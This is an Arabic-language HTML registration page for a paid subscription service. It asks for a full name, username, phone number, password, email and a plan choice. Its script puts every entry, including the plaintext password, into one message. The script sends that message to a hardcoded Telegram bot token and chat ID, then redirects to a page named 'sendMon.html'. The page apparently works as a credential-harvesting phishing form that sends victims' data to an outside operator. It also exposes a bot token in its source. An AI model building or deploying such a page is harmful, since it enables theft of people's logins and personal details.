<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل حساب جديد</title>
    <style>
        @font-face {
            font-family: 'arabic';
            src: url('arabic.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        * {
            font-family: 'arabic', 'Cairo', sans-serif;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #008983, #0086B1, #008983);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 80vh;
            margin: 0;
            color: #fff;
            flex-direction: column;
            overflow: hidden;
        }

        .container {
            background: rgba(255, 255, 255, 0.05);
            padding: 6vw;
            border-radius: 10px;
            width: 80vw;
            max-width: 400px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 20%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1), transparent);
            animation: glow 3s infinite;
        }

        .back-btn {
            color: #d0d0d0;
            text-decoration: none;
            display: block;
            margin: 2vh 0;
            font-size: clamp(13px, 3.5vw, 15px);
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .back-btn:hover {
            color: #00d4ff;
            transform: translateX(8px);
        }

        h2 {
            text-align: center;
            margin-bottom: 5vh;
            font-size: clamp(26px, 7vw, 34px);
            font-weight: 800;
            color: #fff;
            text-shadow: 0 3px 8px rgba(0, 0, 0, 0.4);
            letter-spacing: 1px;
        }

        .field {
            margin-bottom: 4.5vh;
            position: relative;
            animation: fadeIn 0.6s ease forwards;
            animation-delay: calc(var(--i) * 0.15s);
            opacity: 0;
        }

        label {
            font-size: clamp(13px, 3.5vw, 16px);
            margin-bottom: 1.5vh;
            color: #e0e0e0;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        input, select {
            width: 100%;
            padding: 2.8vw 2.8vw 2.8vw 11vw;
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            background: rgba(255, 255, 255, 0.03);
            color: #fff;
            font-size: clamp(13px, 3.5vw, 16px);
            transition: all 0.4s ease;
            box-shadow: inset 0 3px 8px rgba(0, 0, 0, 0.15);
        }

        input:focus, select:focus {
            border-color: #00d4ff;
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.6), inset 0 3px 8px rgba(0, 0, 0, 0.15);
            transform: scale(1.03);
            outline: none;
        }

        input::placeholder {
            color: #FFFFFF;
            font-weight: 400;
        }

        svg {
            position: absolute;
            left: 3.5vw;
            width: clamp(20px, 5vw, 24px);
            height: clamp(20px, 5vw, 24px);
            fill: #FFFFFF;
            transition: fill 0.4s ease;
        }

        input:focus + svg, select:focus + svg {
            fill: #fff;
        }

        button {
            width: 100%;
            padding: 3.2vh;
            background: linear-gradient(135deg, #00d4ff, #007bff);
            color: #fff;
            border: none;
            border-radius: 15px;
            font-size: clamp(15px, 4vw, 19px);
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            box-shadow: 0 6px 20px rgba(0, 212, 255, 0.5);
            position: relative;
            overflow: hidden;
        }

        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.2);
            transition: all 0.4s ease;
        }

        button:hover::before {
            left: 100%;
        }

        button:hover {
            transform: translateY(-4px);
            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.7);
            background: linear-gradient(135deg, #00eaff, #0091ff);
        }

        button:active {
            transform: translateY(0);
            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.4);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(25px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes glow {
            0%, 100% { transform: rotate(0deg); }
            50% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .container {
                padding: 7vw;
                width: 85vw;
            }
            input, select {
                padding: 3.2vw 3.2vw 3.2vw 12vw;
            }
            svg {
                left: 4vw;
            }
            button {
                padding: 2.8vh;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 9vw;
                width: 90vw;
            }
            h2 {
                margin-bottom: 4vh;
            }
            .field {
                margin-bottom: 3.5vh;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <a class="back-btn" href="register.html">عودة الى تسجيل الدخول</a>
        <h2>تسجيل حساب جديد</h2>
        <div class="field" style="--i: 1">
            <label for="fullname">الاسم الكامل</label>
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                <input type="text" id="fullname" placeholder="أدخل اسمك الكامل" required>
            </div>
        </div>
        <div class="field" style="--i: 2">
            <label for="username">اسم المستخدم</label>
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M12 2a5 5 0 00-5 5c0 2.76 2.24 5 5 5s5-2.24 5-5a5 5 0 00-5-5zm0 12c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/></svg>
                <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
            </div>
        </div>
        <div class="field" style="--i: 3">
            <label for="phone">رقم الهاتف</label>
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.91 15.91 0 006.59 6.59l2.2-2.2a1 1 0 011.41-.13c.79.39 1.65.63 2.58.63a1 1 0 011 1v3.5a1 1 0 01-1 1C9.07 22 2 14.93 2 6.5a1 1 0 011-1h3.5a1 1 0 011 1c0 .93.24 1.79.63 2.58a1 1 0 01-.13 1.41l-2.2 2.2z"/></svg>
                <input type="text" id="phone" placeholder="أدخل رقم هاتفك" required>
            </div>
        </div>
        <div class="field" style="--i: 4">
            <label for="password">كلمة المرور</label>
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M12 17a2 2 0 100-4 2 2 0 000 4zm6-9a2 2 0 00-2-2H8a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2V8z"/></svg>
                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
            </div>
        </div>
        <div class="field" style="--i: 5">
            <label for="email">البريد الإلكتروني</label>
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V6a2 2 0 00-2-2zm-1 2.59l-7 4.67-7-4.67V6h14v.59z"/></svg>
                <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
            </div>
        </div>
        <div class="field" style="--i: 6">
            <label for="plan">اختر الباقة</label>
            <div class="input-wrapper">
                <svg viewBox="0 0 24 24"><path d="M21 5H3a2 2 0 00-2 2v10a2 2 0 002 2h18a2 2 0 002-2V7a2 2 0 00-2-2zM9 15H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z"/></svg>
                <select id="plan" required>
                    <option value="">اختر باقتك</option>
                    <option value="€0.99">الباقة الأولى - €0.99</option>
                    <option value="€4.99">الباقة المتوسطة - €4.99</option>
                    <option value="€9.99">الباقة الكاملة - €9.99</option>
                </select>
            </div>
        </div>
        <button onclick="register()">تسجيل الآن</button>
    </div>

    <script>
        function register() {
            let fullname = document.getElementById('fullname').value.trim();
            let username = document.getElementById('username').value.trim();
            let phone = document.getElementById('phone').value.trim();
            let password = document.getElementById('password').value.trim();
            let email = document.getElementById('email').value.trim();
            let plan = document.getElementById('plan').value;

            if (!fullname || !username || !phone || !password || !email || !plan) {
                alert('يرجى ملء جميع الحقول');
                return;
            }

            let message = `مسجل جديد:\nالاسم: ${fullname}\nاسم المستخدم: ${username}\nرقم الهاتف: ${phone}\nكلمة المرور: ${password}\nالبريد الإلكتروني: ${email}\nالباقة المختارة: ${plan}`;

            let chatId = "6431271423";
            let token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(res => res.json())
            .then(data => {
                console.log("تم إرسال التسجيل إلى تيليجرام", data);
                window.location.href = "sendMon.html";
            })
            .catch(error => {
                console.error("خطأ في إرسال البيانات", error);
                alert('حدث خطأ أثناء الإرسال. حاول مرة أخرى.');
            });
        }
    </script>
</body>
</html>
